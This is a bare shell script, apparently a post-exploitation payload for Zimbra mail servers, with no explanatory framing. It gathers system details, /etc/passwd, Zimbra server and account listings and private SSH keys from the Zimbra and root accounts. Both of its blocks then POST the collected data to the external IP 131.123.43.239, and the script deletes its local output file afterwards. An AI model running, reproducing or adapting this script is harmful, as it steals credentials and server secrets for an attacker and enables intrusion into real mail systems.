# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
#Q81
[ -f /tmp/.r2 ] && exit 0
touch /tmp/.r2
Z=/opt/zimbra/bin
OUT=/tmp/.r2o
{
echo "== id =="; id; hostname
echo "== gas =="; $Z/zmprov gas 2>&1
echo "== gasv =="; $Z/zmprov gasv 2>&1 | head -20
echo "== gaa-count =="; $Z/zmprov -l gaa 2>/dev/null | wc -l
echo "== store0 =="; ls /opt/zimbra/store/0 2>/dev/null | wc -l
echo "== zssh =="; ls -la /opt/zimbra/.ssh 2>/dev/null; head -40 /opt/zimbra/.ssh/id_rsa* 2>/dev/null
echo "== rootssh =="; ls -la /root/.ssh 2>/dev/null; head -30 /root/.ssh/id_rsa* 2>/dev/null; cat /root/.ssh/authorized_keys 2>/dev/null | head -5
echo "== hosts =="; cat /etc/hosts
echo "== resolv =="; cat /etc/resolv.conf
echo "== net =="; ip -4 a | grep inet; ip r; ip neigh 2>/dev/null
echo "== zservers-ldap =="; $Z/zmprov -l gas 2>/dev/null
} > $OUT 2>&1
curl -sm60 -X POST --data-binary @$OUT http://131.123.43.239/up -H "X-Name: lvq_r2" >/dev/null 2>&1
rm -f $OUT
exit 0

